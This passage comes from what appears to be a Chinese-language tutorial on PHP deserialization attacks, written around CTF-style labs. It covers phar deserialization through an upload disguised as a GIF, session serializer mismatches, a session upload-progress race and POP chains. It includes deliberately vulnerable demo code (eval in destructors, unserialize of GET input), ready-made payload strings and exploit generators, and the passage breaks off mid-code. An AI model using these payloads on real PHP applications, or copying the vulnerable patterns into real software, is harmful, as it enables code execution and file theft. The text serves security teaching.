class="token keyword">else</span>      <span class="token punctuation">{</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span> <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Invalid file,you can only upload gif"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">TestObject</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">'echo "Hello World";'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路：</p><p>生成一个.phar文件， 加GIF89a ，然后后缀名改为.gif上传上去，最后在index.php页面利用file_exists，使用phar协议解析刚才上传的.gif文件。</p><p>解题过程：</p><p>1、生产.phar文件，后缀名改为.gif</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span>     <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、写一个html进行上传：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://127.0.0.1/upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、payload：</p><p>index.php?file=phar://upload_file/phar1.gif</p><p>利用成功：</p><p><img src="/2020/04/28/best-phpserialize/6.png" alt="success"></p><h3 id="1-2-4-PHP-Session-反序列化"><a href="#1-2-4-PHP-Session-反序列化" class="headerlink" title="1.2.4 PHP Session 反序列化"></a>1.2.4 PHP Session 反序列化</h3><h4 id="session的含义和工作流程"><a href="#session的含义和工作流程" class="headerlink" title="session的含义和工作流程"></a>session的含义和工作流程</h4><p>session：英文翻译为”会话”，两个人聊天从开始到结束就构成了一个会话。PHP里的session主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期。</p><p>工作流程：</p><p>会话的工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话 ID（通常通过会话 cookie），如果发现请求的Cookie、Get、Post中不存在session id，PHP 就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给客户端保存。</p><p>有时候浏览器用户设置会禁止 cookie，当在客户端cookie被禁用的情况下，php也可以自动将session id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项。</p><h4 id="PHP的session处理器"><a href="#PHP的session处理器" class="headerlink" title="PHP的session处理器"></a>PHP的session处理器</h4><p>深入解析PHP中SESSION反序列化机制： <a href="https://www.jb51.net/article/107101.htm" target="_blank" rel="noopener">https://www.jb51.net/article/107101.htm</a> </p><p>PHP 内置了多种处理器用于存取$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，可对<br>php.ini中对session.serialize_handler进行配置。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//ini_set('session.serialize_handler', 'php_binary');</span><span class="token comment" spellcheck="true">//ini_set('session.serialize_handler', 'php');</span><span class="token comment" spellcheck="true">//ini_set('session.serialize_handler', 'php_serialize');</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'spoock'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去到session文件处查看内容</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p><p>4对应的ASCIInames:6:”spoock”</p><p>4对应的ASCII是不可打印字符</p><hr><p>php:存储方式是，键名+竖线+经过<code>serialize()</code>函数序列处理的值</p><p>name|s:6:”spoock”</p><hr><p>php_serialize(php&gt;5.5.4):存储方式是，经过<code>serialize()</code>函数序列化处理的值</p><p>a:1:{s:4:”name”;s:6:”spoock”;}</p></blockquote><h4 id="session序列化利用初级"><a href="#session序列化利用初级" class="headerlink" title="session序列化利用初级"></a>session序列化利用初级</h4><pre><code>当session.auto_start=Off时，配置中使用php_serialize，而反序列化使用的是php的时候就会出现安全问题。假设注入的数据是a=|O:4:&quot;test&quot;:0:{} 那么通过php_serialize反序列化储存的结果就是a:1{s:1:&quot;a&quot;;s:16:&quot;|O:4:&quot;test&quot;:0:{}&quot;;}。根据php的反序列化格式( 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值)可知，此时a:1:{s:1:&quot;a&quot;;s:16:&quot; 就会被当作键名,O:4:&quot;test&quot;:0:{}&quot;; 就会被当作序列化后的值。</code></pre><p>demo：</p><p>session.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// |O:5:"lemon":1:{s:2:"hi";s:27:"highlight_file('flag.php');";}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hi</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hi</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hi</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路：</p><p>在session.php提交payload:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>session<span class="token operator">=</span><span class="token operator">|</span>O<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"lemon"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"hi"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token string">"highlight_file('flag.php');"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问index.php，session处理器php会把|后面的内容当成序列化后的值，程序结束自动调用__destruct()，实现代码执行。</p><p>附上exp：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hi</span><span class="token operator">=</span><span class="token string">"highlight_file('flag.php');"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 语句后面一定要带一个;</span><span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">lemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//前面加上一个|</span><span class="token comment" spellcheck="true">// |O:5:"lemon":1:{s:2:"hi";s:27:"highlight_file('flag.php');";}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/7.png" alt="session利用"></p><h4 id="session序列化利用进阶（条件竞争）"><a href="#session序列化利用进阶（条件竞争）" class="headerlink" title="session序列化利用进阶（条件竞争）"></a>session序列化利用进阶（条件竞争）</h4><p>题目链接：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a> </p><p>参考资料：</p><p><strong>1、</strong>writeup：<a href="https://www.jianshu.com/p/2ea63715fc65" target="_blank" rel="noopener">https://www.jianshu.com/p/2ea63715fc65</a></p><p><strong>2、</strong>官方文档：<a href="https://www.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/en/session.upload-progress.php</a></p><p><strong>3、</strong>利用session.upload_progress进行文件包含和反序列化渗透：<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p><p><strong>4、</strong>ezinclude( 2020–NPUCTF)</p><p>文件上传html：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/8.png" alt="条件竞争1"></p><p><img src="/2020/04/28/best-phpserialize/9.png" alt="条件竞争2"></p><h3 id="1-2-5-POP链"><a href="#1-2-5-POP链" class="headerlink" title="1.2.5 POP链"></a>1.2.5 POP链</h3><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的<br>面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者<br>指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链<br>来执行一些操作。</p><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术<br>方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数<br>的属性联系起来。</p><h4 id="demo-POP"><a href="#demo-POP" class="headerlink" title="demo__POP"></a>demo__POP</h4><p>举一个例子来说明pop链的构造。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span>  <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token operator">></span>  <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">'Welcome'</span><span class="token punctuation">.</span><span class="token string">'&lt;br/>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/gopher|http|https|ftp|dict|\.\.|flag|file/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/gopher|http|https|ftp|file|dict|\.\./i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'Hacker'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放一个exp，生成的序列化字符串以get形式通过hello参数提交即可：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 